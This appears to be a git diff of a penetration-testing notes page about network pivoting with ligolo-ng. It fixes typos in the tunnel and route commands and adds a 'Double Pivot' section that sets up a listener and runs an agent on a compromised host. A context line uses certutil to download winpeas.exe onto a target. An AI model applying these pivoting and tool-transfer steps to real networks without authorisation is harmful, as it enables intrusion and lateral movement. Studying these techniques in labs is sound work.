@@ -11,7 +11,7 @@ If we're on a Active directory machine and attacking from a kali, we have to dow
 On kali:
 
 ```
-sudo ip tunap add user felix mode tun logolo
+sudo ip tuntap add user felix mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert
 ```
@@ -33,7 +33,7 @@ start
 and on another terminal on kali we add the subnet we want to access:
 
 ```
-sudo ip route 10.10.14.0/24 dev ligolo
+sudo ip route add 10.10.14.0/24 dev ligolo
 ```
 
 ### Reverse shells from internal network
@@ -89,3 +89,52 @@ certutil -urlcache -f http://<MS01>:1235/winpeas.exe winpeas.exe
 ```
 
 and the file will be transfered
+
+### Double Pivot
+
+{% embed url="https://www.youtube.com/watch?v=LiaBVuz2B4o" %}
+
+Let's say we have a successfull pivot, we manage to get a shell on a machine and discover a new subnet we want to scan:
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+on our kali:
+
+```
+sudo ip tuntab add user felix mode tun ligolo1; sudo ip link set ligolo1 up
+```
+
+On the ligolo session:
+
+```
+listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:9001 -tcp
+#check if up:
+listener_list
+```
+
+Then we transfer our agent on the ubuntu machine we control and type:
+
+```
+./agent --connect 172.16.0.2:9001 -ignore-cert
+```
+
+On ligolo session:
+
+```
+session
+2
+#check:
+ifconfig
+```
+
+On our kali:
+
+```
+sudo ip route add 10.10.10.0/24 dev ligolo1
+```
+
+and ligolo session:
+
+```
+start --tun ligolo1
+```
